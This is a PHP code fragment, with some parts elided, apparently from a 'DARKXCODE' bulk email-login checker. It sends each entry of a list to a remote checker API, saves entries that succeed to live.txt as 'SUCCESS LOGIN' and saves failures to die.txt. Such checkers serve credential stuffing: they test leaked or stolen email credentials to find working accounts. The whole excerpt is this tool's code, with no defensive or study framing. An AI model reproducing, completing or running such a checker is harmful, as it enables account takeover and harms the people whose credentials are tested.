...
foreach ($lists as $list) {
    ...
    $api = $APIs . "/checker/email_other_checker/V2/?list=$list&apikey=$apikey";
        // CURL
        $ch = curl_init();
        ...
        $msg = $js['data']['msg'];
        $domain = $js['data']['domain'];
    
        if(strpos($x, '"status":"success"')){
            $live++;
            save_file("result/live.txt","$list");
            echo "[$RD$no$DEF/$GR$total$DEF]$GR SUCCESS LOGIN$DEF =>$BL $list$DEF | [$YL DOMAIN$DEF: $WH$domain$DEF ] [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (V2)".PHP_EOL;
        }else if (strpos($x, '"status":"failed"')){
            $die++;
            save_file("result/die.txt","$list");
            echo "[$RD$no$DEF/$GR$total$DEF]$RD DIE$DEF =>$BL $list$DEF | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (V2)".PHP_EOL;
        }else{
            $unknown++;
